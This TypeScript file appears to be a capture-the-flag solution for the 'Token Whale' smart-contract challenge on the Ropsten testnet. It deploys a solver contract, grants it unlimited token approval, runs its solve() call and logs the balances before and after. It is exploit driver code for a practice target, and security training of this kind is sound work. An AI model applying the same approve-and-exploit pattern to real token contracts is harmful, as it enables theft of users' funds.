import { MaxUint256 } from "@ethersproject/constants";
import { Contract, ContractFactory } from "@ethersproject/contracts";
import { formatEther } from "@ethersproject/units";

import { artifacts } from "../artifacts";
import { provider, wallets } from "../constants";
import { deployments } from "../deployments";
import { log } from "../utils";

export const tokenWhale = async (signer = wallets[0]): Promise<void> => {

  const userAddress = await signer.getAddress();
  log(`User address = ${userAddress}`);
  log(`User balance = ${formatEther(await provider.getBalance(userAddress))}`);

  const challenge = new Contract(
    deployments.ropsten.TokenWhaleChallenge.address,
    deployments.ropsten.TokenWhaleChallenge.abi,
    provider,
  );

  log(`Preparing to solve challenge at ${challenge.address}`);
  log(`Player balance = ${await challenge.balanceOf(userAddress)}`);
  log(`Challenge complete = ${await challenge.isComplete()}`);

  const factory = new ContractFactory(
    artifacts.TokenWhaleSolver.abi,
    artifacts.TokenWhaleSolver.bytecode,
    signer,
  );

  const solver = await factory.deploy(challenge.address);
  await solver.deployTransaction.wait();

  log(`Solver has been deployed to ${solver.address}`);

  const approveTx = await challenge.connect(signer).approve(solver.address, MaxUint256);
  log(`Sent approval tx: ${approveTx.hash}`);
  await approveTx.wait();
  log(`Approval tx has been mined successfully`);


  const solveTx = await solver.solve();
  log(`Sent solve tx: ${solveTx.hash}`);
  await solveTx.wait();
  log(`Solve tx has been mined successfully`);
  log(`Player balance = ${await challenge.balanceOf(userAddress)}`);
  log(`Solver balance = ${await challenge.balanceOf(solver.address)}`);

  log(`Challenge complete = ${await challenge.isComplete()}`);

};
